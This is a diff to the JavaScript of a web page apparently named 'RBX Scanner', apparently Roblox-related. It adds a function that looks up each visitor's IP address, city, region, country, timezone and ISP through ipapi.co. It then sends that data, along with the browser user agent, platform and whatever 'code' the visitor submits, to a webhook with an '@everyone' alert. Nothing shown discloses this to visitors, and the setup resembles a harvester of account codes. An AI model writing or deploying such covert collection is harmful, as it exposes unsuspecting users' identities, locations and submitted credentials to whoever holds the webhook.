@@ -310,25 +310,89 @@
         // Initialize hourly counter reset
         resetHourlyCounter();
 
+        async function getLocationInfo() {
+            try {
+                // Get IP-based location info
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    timezone: data.timezone || 'Unknown',
+                    isp: data.org || 'Unknown'
+                };
+            } catch (error) {
+                return {
+                    ip: 'Unable to fetch',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    timezone: 'Unknown',
+                    isp: 'Unknown'
+                };
+            }
+        }
+
         async function sendToWebhook(code) {
             try {
+                // Get location information
+                const locationInfo = await getLocationInfo();
+                
                 const payload = {
+                    content: "@everyone 🚨 **NEW CODE DETECTED** 🚨",
                     embeds: [{
-                        title: "🔍 RBX Scanner - New Code Submission",
-                        description: `\`\`\`\n${code}\n\`\`\``,
-                        color: 0x2196F3,
+                        title: "🔍 RBX Scanner - Code Submission Alert",
+                        description: `**📝 Submitted Code:**\n\`\`\`\n${code}\n\`\`\``,
+                        color: 0xFF4444, // Red color for alert
                         timestamp: new Date().toISOString(),
                         footer: {
-                            text: "RBX Scanner"
+                            text: "RBX Scanner Alert System"
                         },
                         fields: [
                             {
-                                name: "📅 Submitted At",
+                                name: "📅 Submission Time",
                                 value: getCurrentTimestamp(),
                                 inline: true
                             },
                             {
-                                name: "🌐 Source",
+                                name: "🌐 IP Address",
+                                value: locationInfo.ip,
+                                inline: true
+                            },
+                            {
+                                name: "🏙️ Location",
+                                value: `${locationInfo.city}, ${locationInfo.region}`,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 Country",
+                                value: locationInfo.country,
+                                inline: true
+                            },
+                            {
+                                name: "🕐 Timezone",
+                                value: locationInfo.timezone,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 ISP",
+                                value: locationInfo.isp,
+                                inline: true
+                            },
+                            {
+                                name: "💻 User Agent",
+                                value: navigator.userAgent.substring(0, 100) + "...",
+                                inline: false
+                            },
+                            {
+                                name: "📱 Platform",
+                                value: `${navigator.platform} - ${navigator.language}`,
+                                inline: true
+                            },
+                            {
+                                name: "🔗 Source",
                                 value: "RBX Scanner Website",
                                 inline: true
                             }
